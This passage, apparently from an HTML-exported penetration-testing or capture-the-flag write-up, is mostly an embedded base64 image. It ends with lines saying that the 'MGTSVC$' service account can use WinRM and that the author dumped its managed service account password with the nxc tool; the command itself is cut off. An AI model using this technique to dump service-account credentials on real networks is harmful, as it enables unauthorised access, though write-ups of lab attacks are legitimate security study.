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" alt="91c4f9a474db18c1ea94b9d477edee0f.png"/></p>
+<p>I also notice the <code class="inline-code">MGTSVC$</code> service account have the privileges to use WinRM. To dump the GMSA password, I used <code class="inline-code">nxc</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
